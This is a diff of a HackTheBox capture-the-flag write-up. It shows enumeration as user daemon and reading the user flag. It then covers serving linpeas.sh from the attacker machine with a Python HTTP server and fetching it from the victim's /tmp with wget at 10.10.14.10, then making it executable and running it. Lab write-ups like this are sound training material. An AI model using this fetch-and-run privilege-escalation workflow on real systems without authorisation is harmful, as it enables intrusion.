@@ -49,7 +49,7 @@ Let's upgrade the shell. I used the following.<br>
 ``` enter ```<br>
 
 We're a normal user daemon. I started off with ``` sudo -l ``` but it asked for a password. Let's move on.
-I look around a bit and ``` cd /home ``` directory and do a ``` ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  
+I look around a bit and ``` cd /home ``` directory and do a ``` ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I use <em><strong>cat user.txt</em></strong> at it and we get out our first flag.  
 
 ![image](https://user-images.githubusercontent.com/110210595/185814188-b2d3ad0a-a11d-4f7e-a4bc-49c2566b5fa1.png)
 
@@ -57,10 +57,10 @@ I look around a bit and ``` cd /home ``` directory and do a ``` ls ``` and see w
 
 Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh<br>
 I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine.<br>
-I use python3 -m http.server 80 get the server up and running.<br>
+I use ``` python3 -m http.server 80 ``` to get the server up and running.<br>
 On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.<br>
-The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file.<br>
-I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
+The file gets transferred over no problem. I use ``` chmod +x linpeas.sh ``` making it an executable file.<br>
+I use ``` ./linpeas.sh ``` and it runs no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
 
 ![image](https://user-images.githubusercontent.com/110210595/185814232-c92b51cf-c297-46b9-ad1f-ed45077f1d5d.png)
 
